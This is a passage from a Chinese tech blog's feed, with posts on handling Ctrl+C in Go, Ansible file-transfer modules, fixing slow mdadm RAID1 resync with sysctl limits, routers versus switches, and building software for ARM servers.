class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"os/signal"</span></span><br><span class="line"><span class="string">"sync"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WaitForCtrlC</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> end_waiter sync.WaitGroup</span><br><span class="line">end_waiter.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">var</span> signal_channel <span class="keyword">chan</span> os.Signal</span><br><span class="line">signal_channel = <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(signal_channel, os.Interrupt)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-signal_channel</span><br><span class="line">end_waiter.Done()</span><br><span class="line">&#125;()</span><br><span class="line">end_waiter.Wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">testCode</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"Test code..."</span>)</span><br><span class="line">time.Sleep(time.Duration(<span class="number">1</span>) * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Press Ctrl+C to end\n"</span>)</span><br><span class="line"><span class="keyword">go</span> testCode()</span><br><span class="line">WaitForCtrlC()</span><br><span class="line">fmt.Printf(<span class="string">"Receive Ctrl+C.\n"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;有时候在运行代码的时候，想要程序在接收到 Ctrl+C 指令的时候做一些平滑的处理，来写一下在 Python 和 Golang 中如何接收 
      
    
    </summary>
    
    
      <category term="Python" scheme="https://zdyxry.github.io/tags/Python/"/>
    
      <category term="Golang" scheme="https://zdyxry.github.io/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>使用 Ansible 传输文件的几种方式</title>
    <link href="https://zdyxry.github.io/2019/11/22/%E4%BD%BF%E7%94%A8-Ansible-%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>https://zdyxry.github.io/2019/11/22/使用-Ansible-传输文件的几种方式/</id>
    <published>2019-11-22T12:15:17.000Z</published>
    <updated>2019-11-23T13:09:04.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Ansible 作为一款配置管理和应用部署的软件，日常使用的场景很多，我自己也是重度用户。最近在使用 Ansible 进行文件传输的时候踩了个坑，借此机会整理下 Ansible 传输文件的几种方式。</p><p>实验环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran ~]<span class="comment"># ansible --version</span></span><br><span class="line">ansible 2.7.12</span><br><span class="line">  config file = None</span><br><span class="line">  configured module search path = [u<span class="string">'/root/.ansible/plugins/modules'</span>, u<span class="string">'/usr/share/ansible/plugins/modules'</span>]</span><br><span class="line">  ansible python module location = /usr/lib/python2.7/site-packages/ansible</span><br><span class="line">  executable location = /usr/bin/ansible</span><br><span class="line">  python version = 2.7.5 (default, Aug  7 2019, 00:51:29) [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]</span><br></pre></td></tr></table></figure><h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><p><a href="https://docs.ansible.com/ansible/latest/modules/template_module.html" target="_blank" rel="noopener">https://docs.ansible.com/ansible/latest/modules/template_module.html</a></p><p>Ansible 一个常用的功能就是配置管理，通过 Ansible 批量分发配置文件，达到统一版本管理的效果，如果我们想要进行少量的文件传输，从控制节点传输到被管理节点，那么可以采用这种方式来完成。</p><p>具体的使用<a href="https://docs.ansible.com/ansible/latest/modules/template_module.html" target="_blank" rel="noopener">官方文档</a> 已经讲的很详细了，这里不再啰嗦。</p><p>因为版本是通过 Jinja2 模板传输，支持模板渲染<br>虽然我们可以在模版中不制定任何参数，直接将其拷贝，但是相比 Copy/Fetch 模块还是需要有模版渲染的一步，速度要慢一些</p><h2 id="Copy-Fetch-模块"><a href="#Copy-Fetch-模块" class="headerlink" title="Copy/Fetch 模块"></a>Copy/Fetch 模块</h2><p><a href="https://docs.ansible.com/ansible/latest/modules/copy_module.html" target="_blank" rel="noopener">https://docs.ansible.com/ansible/latest/modules/copy_module.html</a></p><p><a href="https://docs.ansible.com/ansible/latest/modules/fetch_module.html" target="_blank" rel="noopener">https://docs.ansible.com/ansible/latest/modules/fetch_module.html</a></p><p>如果说我们通过模板来传输文件优点歪门邪道，那么通过 Copy/Fetch 就是 Ansible 官方提供的两个正统模块。</p><p>Copy 用于把文件（或文件夹）从控制节点（或远程节点）分发到被管理节点，Copy 在拷贝过程中不会修改文件中的内容或编码，仅仅做传输工作。</p><p>Fetch 用于从被管理节点传输文件到控制节点。需要注意的是 Fetch 只能拉取文件，而 Copy 是可以传输文件或者文件夹的。</p><h3 id="不算坑的坑"><a href="#不算坑的坑" class="headerlink" title="不算坑的坑"></a>不算坑的坑</h3><p>在使用 Copy/Fetch 时，总体感受是比较好的，但是有一点需要注意，如果你拷贝的文件过多，或者单个文件大小过大，那么最好不要使用 Copy/Fetch。</p><p>Ansible 默认配置中，使用 SFTP 作为文件传输协议：</p><blockquote><p>There’s really no reason to change this unless problems are encountered, and then there’s also no real drawback to managing the switch. Most environments support SFTP by default and this doesn’t usually need to be changed.</p></blockquote><p>SFTP 是基于 SSH 协议的，与 FTP 没啥关系。SFTP 并不以性能渐长，甚至可以说性能很差，至少与 FTP、Rsync 没办法相比。</p><p>关于 SFTP 为什么速度这么慢，StackOverFlow 有个回答写的很详细，这里引用一段：</p><blockquote><p>I’m the author of HPN-SSH and I was asked by a commenter here to weigh in. I’d like to start with a couple of background items. First off, it’s important to keep in mind that SSHv2 is a multiplexed protocol - multiple channels over a single TCP connection. As such, the SSH channels are essentially unaware of the underlying flow control algorithm used by TCP. This means that SSHv2 has to implement its own flow control algorithm. The most common implementation basically reimplements sliding windows. The means that you have the SSH sliding window riding on top of the TCP sliding window. The end results is that the effective size of the receive buffer is the minimum of the receive buffers of the two sliding windows.</p></blockquote><h2 id="Synchronize"><a href="#Synchronize" class="headerlink" title="Synchronize"></a>Synchronize</h2><p>上面提到的两个模块性能都不好，总会有个性能好的来解决这个问题，就是 Synchronize。Synchronize 是通过 rsync 来达到文件传输的目的，是 rsync 的封装。</p><p>在使用上因为是调用的 rsync，所以控制节点需要安装 rsync ，Synchronize 模块的并不会完全实现 rsync 所有功能，只是通过 rsync 来达到我们想要的快速同步的功能。</p><h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>在使用 Ansible 过程中，通常会使用普通用户配合密钥的形式来进行用户验证，如果需要 root 权限那么通过 become 关键字来提权。</p><p>在 sudo 的早期版本中， <code>/etc/sudoers</code> 中有这么一条配置，高版本取消了 tty 的限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># Disable &quot;ssh hostname sudo &lt;cmd&gt;&quot;, because it will show the password in clear.</span><br><span class="line">#         You have to run &quot;ssh -t hostname sudo &lt;cmd&gt;&quot;.</span><br><span class="line">#</span><br><span class="line">Defaults    requiretty</span><br></pre></td></tr></table></figure><p>这个配置会导致 Ansible 调用 rsync 执行时失败，可以通过修改 <code>/etc/sudoers</code> 或者升级 sudo 软件包来解决。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>那么说了以上这三种方式，就需要来一个总结对比，看看什么场景下使用什么模块更方便：</p><table><thead><tr><th>模块</th><th>传输文件</th><th>传输文件夹</th><th>文件修改</th><th>文件编码</th><th>速度</th><th>文件源</th><th>权限配置</th><th>文件验证</th></tr></thead><tbody><tr><td>Template</td><td>Y</td><td>N</td><td>Y</td><td>Y</td><td>慢</td><td>控制节点</td><td>Y</td><td>Y </td></tr><tr><td>Copy/Fetch</td><td>Y</td><td>Y/N</td><td>N</td><td>N</td><td>慢</td><td>控制节点/远程节点</td><td>Y</td><td>Y </td></tr><tr><td>Synchronize</td><td>N</td><td>Y</td><td>N</td><td>N</td><td>快</td><td>控制节点</td><td>Y</td><td>N </td></tr></tbody></table><p>各个模块没有具体的好坏，全看个人需求来使用合适的模块就好。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://docs.ansible.com/ansible/latest/modules/template_module.html" target="_blank" rel="noopener">https://docs.ansible.com/ansible/latest/modules/template_module.html</a> </li><li><a href="https://daniel.haxx.se/blog/2010/12/08/making-sftp-transfers-fast/" target="_blank" rel="noopener">https://daniel.haxx.se/blog/2010/12/08/making-sftp-transfers-fast/</a></li><li><a href="https://stackoverflow.com/questions/8849240/why-when-i-transfer-a-file-through-sftp-it-takes-longer-than-ftp" target="_blank" rel="noopener">https://stackoverflow.com/questions/8849240/why-when-i-transfer-a-file-through-sftp-it-takes-longer-than-ftp</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;Ansible 作为一款配置管理和应用部署的软件，日常使用的场景很多，我自己也是重度用户。最近在使用 Ansible 进行文件传输的时候踩了
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
      <category term="Ansible" scheme="https://zdyxry.github.io/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>为什么你的 mdadm 同步这么慢</title>
    <link href="https://zdyxry.github.io/2019/11/15/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84-mdadm-%E5%90%8C%E6%AD%A5%E8%BF%99%E4%B9%88%E6%85%A2/"/>
    <id>https://zdyxry.github.io/2019/11/15/为什么你的-mdadm-同步这么慢/</id>
    <published>2019-11-15T12:20:03.000Z</published>
    <updated>2019-11-15T13:02:53.796Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>自己一直通过 mdadm 在软件层面对多块磁盘进行 RAID1 配置，一个主要的原因是 mdadm 是 KickStart 默认软件。因为只是 RAID1，所以使用起来也是比较方便，虽然有些小坑，但总体来说还好。<br>最近遇到一个问题， mdadm 在配置 RAID1 时，磁盘同步很慢。</p><h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>先说下磁盘构成，一般情况下是这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran 20:23:48 ~]<span class="variable">$lsblk</span></span><br><span class="line">NAME      MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT</span><br><span class="line">sda         8:0    0  59.6G  0 disk</span><br><span class="line">├─sda1      8:1    0   256M  0 part  /boot/efi</span><br><span class="line">└─sda2      8:2    0   512M  0 part  /boot</span><br><span class="line">sdb         8:16   0 223.6G  0 disk</span><br><span class="line">└─sdb1      8:17   0    45G  0 part</span><br><span class="line">  └─md127   9:127  0    45G  0 raid1 /</span><br><span class="line">sdc         8:32   0 223.6G  0 disk</span><br><span class="line">└─sdc1      8:33   0    45G  0 part</span><br><span class="line">  └─md127   9:127  0    45G  0 raid1 /</span><br></pre></td></tr></table></figure><p>两块 SSD 各自分区，并将第一个分区通过 mdadm 做 RAID1，保证系统分区高可用，分区大小是 45G，但是因为是 SSD 磁盘，所以速度也不会慢到哪去。</p><p>最近遇到的问题就是我觉得最不应该有问题的地方：同步速度很慢，非常慢，慢到离谱：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran 20:28:00 ~]<span class="variable">$mdadm</span> -D /dev/md127</span><br><span class="line">/dev/md127:</span><br><span class="line">           Version : 1.2</span><br><span class="line">     Creation Time : Thu Nov 14 10:06:52 2019</span><br><span class="line">        Raid Level : raid1</span><br><span class="line">        Array Size : 47153152 (44.97 GiB 48.28 GB)</span><br><span class="line">     Used Dev Size : 47153152 (44.97 GiB 48.28 GB)</span><br><span class="line">      Raid Devices : 2</span><br><span class="line">     Total Devices : 2</span><br><span class="line">       Persistence : Superblock is persistent</span><br><span class="line"></span><br><span class="line">     Intent Bitmap : Internal</span><br><span class="line"></span><br><span class="line">       Update Time : Fri Nov 15 20:28:01 2019</span><br><span class="line">             State : clean, degraded, recovering</span><br><span class="line">    Active Devices : 1</span><br><span class="line">   Working Devices : 2</span><br><span class="line">    Failed Devices : 0</span><br><span class="line">     Spare Devices : 1</span><br><span class="line"></span><br><span class="line">Consistency Policy : bitmap</span><br><span class="line"></span><br><span class="line">    Rebuild Status : 0% complete</span><br><span class="line"></span><br><span class="line">              Name : localhost:root</span><br><span class="line">              UUID : 257cd7f6:effadd5a:3e16dac1:9a28362d</span><br><span class="line">            Events : 90</span><br><span class="line"></span><br><span class="line">    Number   Major   Minor   RaidDevice State</span><br><span class="line">       0       8       17        0      active sync   /dev/sdb1</span><br><span class="line">       1       8       33        1      spare rebuilding   /dev/sdc1</span><br><span class="line">[root@yiran 20:28:04 ~]<span class="variable">$cat</span> /proc/mdstat</span><br><span class="line">Personalities : [raid1]</span><br><span class="line">md127 : active raid1 sdc1[1] sdb1[0]</span><br><span class="line">      47153152 blocks super 1.2 [2/1] [U_]</span><br><span class="line">      [&gt;....................]  recovery =  0.0% (8832/47153152) finish=621.6min speed=1261K/sec</span><br><span class="line">      bitmap: 1/1 pages [4KB], 65536KB chunk</span><br><span class="line"></span><br><span class="line">unused devices: &lt;none&gt;</span><br></pre></td></tr></table></figure><h2 id="调查"><a href="#调查" class="headerlink" title="调查"></a>调查</h2><p>确认硬件没问题之后，尝试通过 <code>/proc/mdstat</code> 可以看到同步速度只有 1M 左右，通过 <code>iostat</code> 命令看磁盘读写状态发现磁盘没有任何压力，使用率也是正常水平。</p><p>到这里没啥想法了，想到一点，系统是如何设置软 raid 同步速度的呢？</p><p>软 raid 在进行同步时，肯定会对磁盘进行大量的读写来保证磁盘数据正确性，如果是 RAID1 ，那就是完全的镜像了。如果 RAID 分区上正在进行非常重要的业务读写，但是 mdadm 又占用了比较大的读写带宽，肯定会影响到我们的业务，所以系统应该是存在一个上限值的。</p><p>经过搜索，查到了两个系统参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/dev/raid/speed_limit_max</span><br><span class="line">/proc/sys/dev/raid/speed_limit_min</span><br></pre></td></tr></table></figure><p>看一下系统默认值，发现 speed_limit_max 是200M，也就是说我现在的速度远远达不到上限，还有其他原因。</p><p>可惜的是，我查看了系统 /var/log/messages 和 dmesg ，都没有发现什么线索。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>因为这个问题虽然不重要，但是比较紧急，所以就在不知道原因的情况下先修复了它，我们可以在 <code>/etc/sysctl.conf</code> 中添加这两项配置来更改相应的数值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran 20:59:34 ~]<span class="variable">$cat</span> /etc/sysctl.conf</span><br><span class="line"><span class="comment"># sysctl settings are defined through files in</span></span><br><span class="line"><span class="comment"># /usr/lib/sysctl.d/, /run/sysctl.d/, and /etc/sysctl.d/.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Vendors settings live in /usr/lib/sysctl.d/.</span></span><br><span class="line"><span class="comment"># To override a whole file, create a new file with the same in</span></span><br><span class="line"><span class="comment"># /etc/sysctl.d/ and put new settings there. To override</span></span><br><span class="line"><span class="comment"># only specific settings, add a file with a lexically later</span></span><br><span class="line"><span class="comment"># name in /etc/sysctl.d/ and put new settings there.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For more information, see sysctl.conf(5) and sysctl.d(5).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">dev.raid.speed_limit_min = 100000</span><br><span class="line">dev.raid.speed_limit_max = 200000</span><br><span class="line">[root@yiran 20:59:42 ~]<span class="variable">$sysctl</span> -p</span><br><span class="line">dev.raid.speed_limit_min = 100000</span><br><span class="line">dev.raid.speed_limit_max = 200000</span><br></pre></td></tr></table></figure><p>在<a href="https://www.cyberciti.biz/tips/linux-raid-increase-resync-rebuild-speed.html" target="_blank" rel="noopener">这篇博客</a> 中还提到了其他方式能够提升软 raid 的同步速度，比如设置 read-ahead、条带大小、Bitmap 等，但是都不如 sysctl 调整系统参数来的方便，而且副作用也没有那么大。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>提交了一个不知道问题原因的修复 Patch，内心还是有些慌的，如果有读者看到并知道原因，麻烦留言告诉我，谢谢。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cyberciti.biz/tips/linux-raid-increase-resync-rebuild-speed.html" target="_blank" rel="noopener">https://www.cyberciti.biz/tips/linux-raid-increase-resync-rebuild-speed.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;自己一直通过 mdadm 在软件层面对多块磁盘进行 RAID1 配置，一个主要的原因是 mdadm 是 KickStart 默认软件。因为只
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>路由器 vs 交换机</title>
    <link href="https://zdyxry.github.io/2019/11/09/%E8%B7%AF%E7%94%B1%E5%99%A8-vs-%E4%BA%A4%E6%8D%A2%E6%9C%BA/"/>
    <id>https://zdyxry.github.io/2019/11/09/路由器-vs-交换机/</id>
    <published>2019-11-09T01:59:07.000Z</published>
    <updated>2019-11-09T01:59:23.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>交换机和路由器大家应该都听说过，大部分也用过，但是它俩有啥联系，又有啥区别？</p><p>P.S. 最近看《OSTEP》看的脑子有点短路，趁着周末看点网络的东西。</p><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><blockquote><p>路由器（英语：Router，又称路径器）是一种电讯网络设备，提供路由与转送两种重要机制，可以决定封包从来源端到目的端所经过的路由路径（host 到 host 之间的传输路径），这个过程称为路由；将路由器输入端的封包移送至适当的路由器输出端（在路由器内部进行），这称为转送。路由工作在OSI模型的第三层——即网络层，例如网际协议（IP）。</p></blockquote><p>路由器主要具有两个职能：</p><ul><li>路由器确保信息不到达不需要到达的位置</li><li>路由器确保信息到达所需要的正确目的地</li></ul><p>在执行以上这两种职能中，路由器连接两个网络，将信息从一个网络传送至另一个网络。在某些情况下，还执行两个网络间的多种协议的翻译职能。此外它还确保网络之间通信路由的相互独立，预防其中一个网络上的多余流量溢出到另一个网络上。该过程称为路由选择。</p><p>路由选择是 OSI 模型第三层（网络层的）一个功能。路由器通过网络层协议头如 IP 头（包含源地址和目的地址）和路由表，选择转发数据包的最佳路径。为选择任意两个主机间的最佳路由，实现路由器间的通信，通常需要应用如 ICMP 这样的路由选择协议。</p><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><blockquote><p>网络交换机（Network switch）是一种网络数据转发设备，能够对数据包进行高速的“交换”。二层交换机工作于OSI参考模型的第二层，即数据链路层。</p></blockquote><blockquote><p>交换机内部的CPU会在每个端口成功连接时，通过将MAC地址和端口对应，形成一张 MAC 表。在今后的通讯中，发往该MAC地址的数据包将仅送往其对应的端口，而不是所有的端口。交换机对数据包的转发是建立在MAC (Media Access Control) 地址–物理地址基础之上的，对于IP 网络协议来说，它是透明的，即交换机在转发数据包时，不知道也无须知道信源机和信宿机的IP 地址，只需知其物理地址即MAC 地址。</p></blockquote><blockquote><p>交换机在操作过程当中会不断的收集资料去建立它本身的一个地址表，这个表相当简单，它说明了某个MAC 地址是在哪个端口上被发现的，所以当交换机收到一个TCP/IP 封包时，它便会看一下该数据包的目的 MAC 地址，核对一下自己的地址表以确认应该从哪个端口把数据包发出去。由于这个过程比较简单，加上这功能由一崭新硬件进行——ASIC (Application Specific Integrated Circuit) ，因此速度相当快，一般只需几十微秒，交换机便可决定一个IP 封包该往那里送。</p></blockquote><blockquote><p>值得一提的是：万一交换机收到一个不认识的封包，就是说如果目的地MAC 地址不能在地址表中找到时，交换机会把IP 封包”扩散”出去，即把它从每一个端口中送出去，就如交换机在处理一个收到的广播封包时一样。</p></blockquote><blockquote><p>二层交换机的弱点正是它处理广播封包的手法不太有效，比方说，当一个交换机收到一个从TCP/IP 工作站上发出来的广播封包时，他便会把该封包传到所有其他端口去，哪怕有些端口上连的是IPX 或DECnet 工作站。这样一来，非TCP/IP 节点的带宽便会受到负面的影响，就算同样的TCP/IP 节点，如果他们的子网跟发送那个广播封包的工作站的子网相同，那么他们也会无原无故地收到一些与他们毫不相干的网络广播，整个网络的效率因此会大打折扣。</p></blockquote><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><table><thead><tr><th></th><th>路由器</th><th>交换机</th></tr></thead><tbody><tr><td>OSI</td><td>网络层</td><td>数据链路层</td></tr><tr><td>数据传输地址</td><td>IP 地址</td><td>MAC 地址</td></tr><tr><td>使用范围</td><td>局域网/广域网</td><td>局域网</td></tr><tr><td>存储信息</td><td>路由表</td><td>MAC 地址与端口映射表</td></tr><tr><td>传输方式</td><td>全双工</td><td>全双工</td></tr><tr><td>隔离方式</td><td>划分子网</td><td>划分 VLAN</td></tr><tr><td>具体用途</td><td>连接多个网络</td><td>连接一个网络内的多个设备</td></tr></tbody></table><p>那么路由器和交换机可以互相替换么？</p><p>路由器通常带有 WAN 口和多个 LAN 口，其中多个 LAN 口可以看作一个小型的交换机，只是端口数量较少。二层交换机无法替换路由器，因为不具有路由转发的功能。但是现在存在三层交换机，可以实现路由器中的路由转发功能，甚至看到部分三层交换机已经支持了 NAT 功能，那么当不同 VLAN 之间的网络设备想要进行通信，就可以直接通过三层交换机找到对应路由，交换机学习到了 MAC 地址与 IP 地址的对应关系后，后续直接通过二层联通，不需要经过查找路由这一步了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://pc.net/helpcenter/answers/difference_between_switch_and_router" target="_blank" rel="noopener">https://pc.net/helpcenter/answers/difference_between_switch_and_router</a></li><li><a href="https://www.diffen.com/difference/Router_vs_Switch" target="_blank" rel="noopener">https://www.diffen.com/difference/Router_vs_Switch</a></li><li><a href="https://zh.wikipedia.org/zh-hans/%E7%B6%B2%E8%B7%AF%E4%BA%A4%E6%8F%9B%E5%99%A8" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/%E7%B6%B2%E8%B7%AF%E4%BA%A4%E6%8F%9B%E5%99%A8</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;交换机和路由器大家应该都听说过，大部分也用过，但是它俩有啥联系，又有啥区别？&lt;/p&gt;
&lt;p&gt;P.S. 最近看《OSTEP》看的脑子有点短路，
      
    
    </summary>
    
    
      <category term="Network" scheme="https://zdyxry.github.io/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>ARM 服务器？能用？</title>
    <link href="https://zdyxry.github.io/2019/11/01/ARM-%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%9F%E8%83%BD%E7%94%A8%EF%BC%9F/"/>
    <id>https://zdyxry.github.io/2019/11/01/ARM-服务器？能用？/</id>
    <published>2019-11-01T14:12:00.000Z</published>
    <updated>2019-11-01T14:13:22.091Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近各大 2B 厂家都在搞国产化，我司也不例外，花费了些时间折腾了下 ARM 服务器，记录下踩坑和使用感受。</p><p>本文所使用的开发环境为 CentOS7.6。</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>使用的第一步是编译自己的软件，我日常使用的软件发布的最小粒度是 RPM，所以我们需要把自己在 X86 上的软件都重新编译一份 ARM64v8 的。</p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>在预期中，Python 应该是最简单的，直接编译 RPM 就好，我在之前博客<a href="https://zdyxry.github.io/2018/07/28/RPM-%E5%B8%B8%E7%94%A8%E6%9E%84%E5%BB%BA%E6%96%B9%E5%BC%8F/">《RPM 常用构建方式》</a> 中提到过，对于 Python 来说，最简单的是通过 <code>FPM</code> 来构建 RPM，但是这里有两个坑。</p><ol><li>Python 软件是否依赖了 C/C++ ，如果依赖了，那么需要在 ARM 机器上使用 <code>FPM</code> 的时候编译构建 RPM</li><li>从网上下载的 <code>noarch.rpm</code> ，是否真的是 <code>noarch</code> 的？需要仔细检查（别问我怎么知道的</li></ol><p>在我以为一切搞定的时候，想起来还有个服务是需要机器学习等第三方库的，是使用 <code>conda</code> 安装的。<br>好嘛，完蛋了，折腾几个小时下来结论是 <code>conda</code> 对于 ARM64 几乎处于不支持的状态。最后也没搞定。</p><h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><p>最简单的莫过于 Golang 了，在 Golang 1.5 及之后版本，只需要设置 <code>GOOS</code> 和 <code>GOARCH</code> 这两个环境变量就能编译出目标平台的 Go binary 文件。</p><p>在官网中我们可以找到支持列表：</p><table><thead><tr><th>$GOOS</th><th>$GOARCH</th></tr></thead><tbody><tr><td>…</td><td>…</td></tr><tr><td>linux</td><td>386</td></tr><tr><td>linux</td><td>amd64</td></tr><tr><td>linux</td><td>arm</td></tr><tr><td>linux</td><td>arm64</td></tr><tr><td>linux</td><td>ppc64</td></tr><tr><td>linux</td><td>ppc64le</td></tr><tr><td>linux</td><td>mips</td></tr><tr><td>linux</td><td>mipsle</td></tr><tr><td>linux</td><td>mips64</td></tr><tr><td>linux</td><td>mips64le</td></tr><tr><td>linux</td><td>s390x</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p>比如我的目标平台是 Linux ARM64 ，那么我只需要设置 <code>GOOS=linux GOARCH=arm64 go build</code> 即可。</p><p>编译出 binary 文件后，构建 RPM 方式与 x86 差别不大，只需要在 <code>rpmbuild</code> 时增加参数 <code>--target aarch64</code> 就好。</p><h3 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h3><p>这个是最难搞的，好在有 wenquan 同学帮助，在安装了 <code>devtoolset-7</code> 之后也成功构建出来了，顺便让我这个没写过 C/C++ 的人去了解了下 cmake,make,ninja 都是个啥东西（虽然现在又忘了）。</p><p>如果是自己写 Makefile 